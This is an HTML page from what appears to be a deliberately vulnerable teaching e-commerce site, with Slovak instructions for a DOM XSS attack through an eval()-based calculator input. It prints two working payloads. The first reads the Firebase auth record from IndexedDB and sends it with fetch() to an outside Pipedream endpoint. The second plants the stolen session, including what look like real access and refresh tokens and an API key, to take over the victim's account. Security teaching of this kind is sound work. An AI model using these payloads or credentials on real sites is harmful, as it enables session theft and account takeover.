<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Attacks</title>
    <!-- font-awesome -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css"
    />

    <!-- styles css -->
    <link rel="stylesheet" href="../../../../styles.css" />
  </head>

  <body>
  <nav class="navbar page">
    <div class="nav-center">
      <!-- links -->
      <div>
        <button class="toggle-nav">
          <i class="fas fa-bars"></i>
        </button>
        <ul class="nav-links">
          <li>
            <a href="/js-e-commerce/index.html" class="nav-link"> home </a>
          </li>
          <li>
            <a href="/js-e-commerce/src/pages/products.html" class="nav-link"> products </a>
          </li>
          <li>
            <a href="/js-e-commerce/src/pages/about/about.html" class="nav-link"> about </a>
          </li>
          <li>
            <a href="/js-e-commerce/src/pages/attacks/attacks.html" class="nav-link attacks"> attacks </a>
          </li>
        </ul>
      </div>

      <p class="user-name"></p>

      <button class="log-out__button" id="signOutButton">
        <a href="../auth/login.html" id="log-out__link">Log out</a>
      </button>

      <div class="toggle-container">
        <button class="toggle-cart">
          <i class="fas fa-shopping-cart"></i>
        </button>
        <span class="cart-item-count">1</span>
      </div>
    </div>
  </nav>
  <section class="page-hero">
    <div class="section-center">
      <h3 class="page-hero-title">Home / Attacks</h3>
    </div>
  </section>
  <div class="sidebar-overlay">
    <aside class="sidebar">
      <!-- close -->
      <button class="sidebar-close">
        <i class="fas fa-times"></i>
      </button>
      <!-- links -->
      <ul class="sidebar-links">
        <li>
          <a href="/js-e-commerce/index.html" class="sidebar-link">
            <i class="fas fa-home fa-fw"></i>
            home
          </a>
        </li>
        <li>
          <a href="/js-e-commerce/src/pages/products/products.html" class="sidebar-link">
            <i class="fas fa-couch fa-fw"></i>
            products
          </a>
        </li>
        <li>
          <a href="/js-e-commerce/src/pages/about/about.html" class="sidebar-link">
            <i class="fas fa-book fa-fw"></i>
            about
          </a>
        </li>
        <li>
          <a href="/js-e-commerce/src/pages/attacks/attacks.html" class="sidebar-link attacks">
            <i class="fas fa-book fa-fw"></i>
            attacks
          </a>
        </li>
      </ul>
    </aside>
  </div>
    <div class="cart-overlay">
      <aside class="cart">
        <button class="cart-close">
          <i class="fas fa-times"></i>
        </button>
        <header>
          <h3 class="text-slanted">your bag</h3>
        </header>
        <!-- cart items -->
        <div class="cart-items"></div>
        <!-- footer -->
        <footer>
          <h3 class="cart-total text-slanted">total : $12.99</h3>
          <button class="cart-checkout btn">checkout</button>
        </footer>
      </aside>
    </div>
    <section class="section section-center attacks-page">
      <br/>
      <h3>DOM XSS - eval()</h3>
      <div class="attack-about">
        <br>...<br><br>
      </div>
      <br/>
      <h3>Instructions</h3><br>
      <ol>
        <li>eval() je funkcia, ktora vyhodnoti akukolvek hodnotu, ktore je vlozena ako argument. Vie vypocitavat rozne rovnice, preto je idealnym riesenim pre primitivnu kalkulacku.
        Kazdopadne tym, ze vyhodnoti akukolvek hodnotu vyhodnoti aj akykolvek skodlivy kod, ktory ako argument vlozime.</li>
        <li>Input s textom "Enter equation..." vyhodnocuje prave funkcia eval a prerpokladame, ze tu vznika zranitelnost.</li>
        <li>Pokusime sa o ukradnutie uzivatelovych dat z databazy prehliadacu. Do inputu vlozime nasledovny kod.</li>
        <li><pre>
            const request = window.indexedDB.open("firebaseLocalStorageDb");
            request.onsuccess = (event) => {
              const db = event.target.result;

              const transaction = db.transaction(["firebaseLocalStorage"], "readonly");
              const objectStore = transaction.objectStore("firebaseLocalStorage");

              const getDataRequest = objectStore.getAll();

              getDataRequest.onsuccess = (event) => {

              const headers = new Headers();
              headers.append("Content-Type", "text/plain");

              const options = {
                method: "POST",
                headers,
                mode: "cors",
                body: JSON.stringify(event.target.result),
              };

              fetch("https://eojph9o2kgja7k2.m.pipedream.net", options);
              }
            };
        </pre></li>
        <li>Tento kod spristupni lokalnu databazu prehliadaca a umozni nam vytiahnut akukolvek hodnotu z databazy. Nas momentalne zaujima <i>firebaseLocalStorage</i>, ktoru nastavuje
        externa API Firebase, ktoru pouziva aplikacia na autentifikaciu. Po jej vytiahnuti sa cely objekt posle na nas vytvoreny endpoint na Pipedreame.</li>
        <li>Teraz sa mozeme odhlasit a prihlasit do lubovlneho uctu, ktory uz mame vytvoreny alebo si vytvorime novy.</li>
        <li>Prejdeme znova na tuto stranku a vlozime nasledujuci kod do rovnakeho inputu.</li>
        <li><pre>
            const request = window.indexedDB.open("firebaseLocalStorageDb");
            request.onsuccess = (event) => {
              const db = event.target.result;

              const transaction = db.transaction(["firebaseLocalStorage"], "readwrite");
              const objectStore = transaction.objectStore("firebaseLocalStorage");

              const data = {
                fbase_key:
                  "firebase:authUser:AIzaSyCx_Vvo5GYYtbjFgSm0GtQv7TWb6mrAZWg:[DEFAULT]",
                value: {
                  uid: "RTejhfCWw0OAlHcoAj41Fy93ZJJ3",
                  email: "mate@gmail.com",
                  emailVerified: false,
                  isAnonymous: false,
                  providerData: [
                    {
                      providerId: "password",
                      uid: "mate@gmail.com",
                      displayName: null,
                      email: "mate@gmail.com",
                      phoneNumber: null,
                      photoURL: null,
                    },
                  ],
                  stsTokenManager: {
                    refreshToken:
                      "AMf-vByIsfsiw-8vT6jzvFkIqMjZhSvTzJ16dCdww3w_Pk_9kwwfanAaW09W-DWc70KzKjxtp7Dq7aEPRImKkgLIHiCN4ROLsi5NBpvQrRSNGonNI-5wt_
                        9PHITM0bt5ZXSayEMzx7dRUHJdj8-lbwiflyUREJh3TUy-QLmoxyg3rY-G6B1Ff1OQPTv-VRFJGmp3GQ2dJ5Bl0hyBKiELNwcjKDTrVyRjPw",
                    accessToken:
                      "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJhNjI1OTZmNTJmNTJlZDQ0MDQ5Mzk2YmU3ZGYzNGQyYzY0ZjQ1M2UiLCJ0eXAiOiJKV1QifQ
          .eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZGlwbG9tb3ZrYS10ZXN0LWFwcCIsImF1ZCI6ImRpcGxvbW92a2EtdGVzdC1hcHA
          iLCJhdXRoX3RpbWUiOjE3MTE3OTA0OTYsInVzZXJfaWQiOiJSVGVqaGZDV3cwT0FsSGNvQWo0MUZ5OTNaSkozIiwic3ViIjoiUlRlamhmQ1d3ME9BbE
          hjb0FqNDFGeTkzWkpKMyIsImlhdCI6MTcxMTc5MDQ5NiwiZXhwIjoxNzExNzk0MDk2LCJlbWFpbCI6Im1hdGVAZ21haWwuY29tIiwiZW1haWxfdmVyaWZ
          pZWQiOmZhbHNlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbIm1hdGVAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc
          3dvcmQifX0.0Mp-T84dmzTpiAdVyhl68WV2qDvTZ78IHGYca5YpBgBx4A_m_YXoJ-IYBaTl-Yp-fXYzuKN3Vff0iqkNA5nVtUcOFfG1X157DrkE80gxp6e
          7ELg2jn_N6mF1Xw-jTSaJoAAsG8f3e_wHp-cfVqWyBNrcUTABrP8Hy_bv-iyUII60PZtjiu_oo7ObVFhoPEim82rlPJDLiwpPMos7qGEBsvw4-fKQvLPkR
          wkGbCf8bKt6Pn_jThtR9JPuhU_G2SlgppA0PuuLSyO8KViFoH4XgFMi9kyX3YU8vmg7O5bDwCYemLLpvQt4KY900_qQgxS2GnX89h_V-hNu_bGqQpL9Zg",
                    expirationTime: 1711794096425,
                  },
                  createdAt: "1711388904315",
                  lastLoginAt: "1711790496471",
                  apiKey: "AIzaSyCx_Vvo5GYYtbjFgSm0GtQv7TWb6mrAZWg",
                  appName: "[DEFAULT]",
                },
              };

              objectStore.clear()

              const addDataRequest = objectStore.add(data);

              addDataRequest.onsuccess = (event) => alert("Success!");
            };
        </pre></li>
        <li>Tento kod ulozi, respektive prepise data o prihlasenom pouzivatelovi. Objekt data nahradime novym objektom, ktory nam dosiel na Pipedream. Zo skopirovaneho objektu musime zo vsetkych attributov odstranit uvodzovky a nechat len pri hodnotach.</li>
        <li>Po kliknuti <i>Enter</i> sme si do prehliadaca ulozili prihlasovacie udaju obete a teraz sme prihlaseny pod jeho prihalsovacimi udajmi.</li>
      </ol>
      <div class="func-eval-demo">
        <h3>Calculator</h3>
        <input id="eval-input" placeholder="Enter equation..." />
        <div id="eval-result" ></div>
      </div>
      <div class="video__wrapper">
        <video controls >
          <source src="/js-e-commerce/src/assets/videos/dom-xss-eval.mov" type="video/mp4">
          Your browser does not support the video tag.
        </video>
      </div>
    </section>
    <script type="module" src="./domXssEval.js"></script>
  <script type="module" src="/js-e-commerce/src/pages/auth/auth.js"></script>
  <script type="module" src="/js-e-commerce/src/cart/setupCart.js"></script>
  </body>
</html>
